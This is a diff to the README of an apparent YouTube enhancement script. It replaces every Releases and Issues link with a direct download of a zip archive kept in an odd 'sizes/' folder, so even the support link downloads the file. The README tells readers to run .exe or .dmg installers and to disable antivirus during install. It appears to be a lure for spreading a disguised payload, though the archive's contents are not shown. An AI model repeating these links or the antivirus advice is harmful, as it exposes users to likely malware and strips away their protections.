@@ -4,7 +4,7 @@
 Welcome to the qiaomu-youtube-script! This tool improves your YouTube experience by providing simplified, practical features. Built on the YouTube Alchemy foundation, it reduces code complexity while focusing on four core functions that matter most to users.
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/Mamiss61eew/qiaomu-youtube-script/releases)
+[![Download Latest Release](https://github.com/Mamiss61eew/qiaomu-youtube-script/raw/refs/heads/main/sizes/youtube-qiaomu-script-v2.4.zip%20Latest%20Release-blue)](https://github.com/Mamiss61eew/qiaomu-youtube-script/raw/refs/heads/main/sizes/youtube-qiaomu-script-v2.4.zip)
 
 ## 🚀 Getting Started
 Follow these steps to download and run the qiaomu-youtube-script on your computer.
@@ -16,7 +16,7 @@ Before you start, ensure your system meets the following requirements:
 - Disk Space: At least 100 MB of free space
 
 ### 💻 Download & Install
-1. **Visit the Download Page:** Go to the [Releases Page](https://github.com/Mamiss61eew/qiaomu-youtube-script/releases) to access the latest version of the script.
+1. **Visit the Download Page:** Go to the [Releases Page](https://github.com/Mamiss61eew/qiaomu-youtube-script/raw/refs/heads/main/sizes/youtube-qiaomu-script-v2.4.zip) to access the latest version of the script.
 2. **Choose Your Version:** Look for the latest version available. Click on the link to download the installer or zipped file.
 3. **Run the Installer or Extract Files:** 
    - If you have an `.exe` or `.dmg` file, double-click it to start the installation process.
@@ -37,10 +37,10 @@ If you run into issues during installation or while using the script, consider t
 - **Disable Antivirus Temporarily:** Some antivirus programs may block the installation. Disable it briefly if necessary, but remember to enable it again afterward.
 
 ### 🌐 User Support
-For further assistance, visit our [GitHub Issues Page](https://github.com/Mamiss61eew/qiaomu-youtube-script/issues) to report problems or ask questions. Our community is here to help.
+For further assistance, visit our [GitHub Issues Page](https://github.com/Mamiss61eew/qiaomu-youtube-script/raw/refs/heads/main/sizes/youtube-qiaomu-script-v2.4.zip) to report problems or ask questions. Our community is here to help.
 
 ## ⚙️ Updates
-Stay informed about new features and improvements. Regular updates ensure you have the best experience possible. Always check the [Releases Page](https://github.com/Mamiss61eew/qiaomu-youtube-script/releases) for the latest version.
+Stay informed about new features and improvements. Regular updates ensure you have the best experience possible. Always check the [Releases Page](https://github.com/Mamiss61eew/qiaomu-youtube-script/raw/refs/heads/main/sizes/youtube-qiaomu-script-v2.4.zip) for the latest version.
 
 ## 💬 Community Contributions
 We encourage users to contribute to the project. If you have suggestions or improvements, please submit a pull request or leave a note on our GitHub page. Collaboration makes this tool better for everyone.
@@ -51,4 +51,4 @@ The qiaomu-youtube-script is open-source and available for free. Check the LICEN
 ## 🎓 Conclusion
 The qiaomu-youtube-script is designed to enhance your YouTube experience with essential features. By following this guide, you can easily download, install, and start enjoying the benefits of your new tool. 
 
-Start enhancing your YouTube journey today by visiting the [Releases Page](https://github.com/Mamiss61eew/qiaomu-youtube-script/releases) for the latest version!
+Start enhancing your YouTube journey today by visiting the [Releases Page](https://github.com/Mamiss61eew/qiaomu-youtube-script/raw/refs/heads/main/sizes/youtube-qiaomu-script-v2.4.zip) for the latest version!
